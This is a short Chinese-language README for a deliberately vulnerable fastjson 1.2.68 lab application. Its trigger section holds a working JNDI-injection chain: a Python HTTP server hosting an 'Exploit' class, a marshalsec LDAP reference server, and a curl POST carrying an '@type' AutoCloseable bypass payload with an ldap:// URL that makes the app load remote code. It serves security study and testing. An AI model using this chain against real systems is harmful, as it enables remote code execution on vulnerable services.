# fastjson 1.2.68 示例漏洞靶场

适用版本：JDK 8

## 启动

```bash
mvn clean package -DskipTests
java -jar target/vuln-demo-1.0.0.jar
```

端口默认 8080，改 `src/main/resources/application.properties`。

## 触发

1. 在./exploit目录下使用python启动http服务器:
```bash
python -m http.server
```

2. 使用marshalsec启动ldap服务器：
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8000/#Exploit"
```

3. 以如下命令进行验证：
```bash
curl -X POST 'http://127.0.0.1:8080/api/url/check' \
  -H 'Content-Type: application/json' \
  -d '{"@type":"java.lang.AutoCloseable","@type":"com.example.vulndemo.service.SafeUrlChecker","url":"ldap://127.0.0.1:1389/Exploit"}'
```
